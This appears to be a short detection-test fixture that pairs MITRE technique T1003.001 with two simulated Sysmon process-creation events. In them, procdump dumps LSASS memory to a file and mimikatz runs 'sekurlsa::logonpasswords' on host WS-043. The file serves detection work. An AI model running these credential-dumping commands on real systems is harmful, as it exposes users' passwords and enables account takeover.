title: Credential dumping from LSASS memory
techniques: [T1003.001]
events:
  - {service: sysmon, event_id: 1, hostname: WS-043, user: bob, process_name: 'C:\Users\bob\AppData\Local\Temp\procdump64.exe', command_line: 'procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\l.dmp', message: Process created}
  - {service: sysmon, event_id: 1, hostname: WS-043, user: bob, process_name: 'C:\Users\bob\AppData\Local\Temp\mimikatz.exe', command_line: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit', message: Process created}
